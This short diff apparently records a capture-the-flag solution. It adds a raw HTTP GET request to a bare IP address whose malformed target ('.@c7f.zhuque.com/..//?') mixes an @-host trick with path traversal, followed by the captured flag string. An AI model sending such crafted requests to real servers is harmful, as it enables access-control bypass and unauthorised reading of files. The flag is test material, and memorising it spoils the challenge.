@@ -1,0 +1,8 @@
+GET .@c7f.zhuque.com/..//? HTTP/1.1
+Host: 117.50.11.83
+Referer: http://117.50.11.83/
+Accept-Encoding: gzip, deflate
+Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,zh-TW;q=0.7
+Connection: close
+
+flag{f3efb5dc-2b79-47ab-89dd-c9a36915e729}
